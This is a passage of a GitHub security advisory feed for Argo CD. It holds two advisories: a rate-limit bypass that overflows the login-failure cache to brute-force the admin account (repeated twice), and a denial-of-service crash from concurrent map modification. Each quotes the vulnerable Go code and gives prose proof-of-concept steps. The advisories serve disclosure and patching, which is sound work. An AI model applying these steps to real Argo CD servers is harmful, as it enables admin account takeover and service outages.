<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-18T21:46:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-18T21:46:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Denial of Service (DoS) Vulnerability Due to Unsafe Array Modification in Multi-threaded Environment]]></title>
        <id>https://github.com/advisories/GHSA-6v85-wr92-q4p7</id>
        <link href="https://github.com/advisories/GHSA-6v85-wr92-q4p7"/>
        <updated>2024-03-18T21:46:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can exploit a critical flaw in the application to initiate a Denial of Service (DoS) attack, rendering the application inoperable and affecting all users. The issue arises from unsafe manipulation of an array in a multi-threaded environment.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is rooted in the application's code, where an array is being modified while it is being iterated over. This is a classic programming error but becomes critically unsafe when executed in a multi-threaded environment. When two threads interact with the same array simultaneously, the application crashes.</p>
<p>The core issue is located in <a href="https://github.com/argoproj/argo-cd/blob/54601c8fd30b86a4c4b7eb449956264372c8bde0/util/session/sessionmanager.go#L302-L311">expireOldFailedAttempts</a> function:</p>
<pre><code class="language-go">func expireOldFailedAttempts(maxAge time.Duration, failures *map[string]LoginAttempts) int {

expiredCount := 0  
for key, attempt := range *failures {

if time.Since(attempt.LastFailed) &gt; maxAge*time.Second { expiredCount += 1  
delete(*failures, key) // Vulnerable code

} }

return expiredCount }
</code></pre>
<p>The function modifies the array while iterating it which means the code will cause an error and crash the application pod, inspecting the logs just before the crash we can confirm:</p>
<pre><code class="language-go">goroutine 2032 [running]: github.com/argoproj/argo-cd/v2/util/session.expireOldFailedAttempts(0x12c, 0xc000adecd8)

/go/src/github.com/argoproj/argo-cd/util/session/sessionmanager.go:304 +0x7c github.com/argoproj/argo-cd/v2/util/session.(*SessionManager).updateFailureCount(0xc00035 af50, {0xc001b1f578, 0x11}, 0x1)

/go/src/github.com/argoproj/argo-cd/util/session/sessionmanager.go:320 +0x7f github.com/argoproj/argo-cd/v2/util/session.(*SessionManager).VerifyUsernamePassword(0xc 00035af50, {0xc001b1f578, 0x11}, {0xc000455148, 0x8})
</code></pre>
<h3 id="poc">PoC</h3>
<p>To reproduce the vulnerability, you can use the following steps:</p>
<ol>
<li>Launch the application.</li>
<li>Trigger the code path that results in the <code>expireOldFailedAttempts()</code> function being called in multiple threads.</li>
<li>In the attached PoC script we are restarting the server in a while loop, causing the application to be unresponsive at all.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a Denial of Service (DoS) vulnerability. Any attacker can crash the application continuously, making it impossible for legitimate users to access the service. The issue is exacerbated because it does not require authentication, widening the pool of potential attackers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-6v85-wr92-q4p7">https://github.com/argoproj/argo-cd/security/advisories/GHSA-6v85-wr92-q4p7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21661">https://nvd.nist.gov/vuln/detail/CVE-2024-21661</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/2a22e19e06aaf6a1e734443043310a66c234e345">https://github.com/argoproj/argo-cd/commit/2a22e19e06aaf6a1e734443043310a66c234e345</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/5bbb51ab423f273dda74ab956469843d2db2e208">https://github.com/argoproj/argo-cd/commit/5bbb51ab423f273dda74ab956469843d2db2e208</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/ce04dc5c6f6e92033221ec6d96b74403b065ca8b">https://github.com/argoproj/argo-cd/commit/ce04dc5c6f6e92033221ec6d96b74403b065ca8b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/blob/54601c8fd30b86a4c4b7eb449956264372c8bde0/util/session/sessionmanager.go#L302-L311">https://github.com/argoproj/argo-cd/blob/54601c8fd30b86a4c4b7eb449956264372c8bde0/util/session/sessionmanager.go#L302-L311</a></li>
<li><a href="https://github.com/advisories/GHSA-6v85-wr92-q4p7">https://github.com/advisories/GHSA-6v85-wr92-q4p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v85-wr92-q4p7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:28:42.000Z</published>
    </entry>
</feed>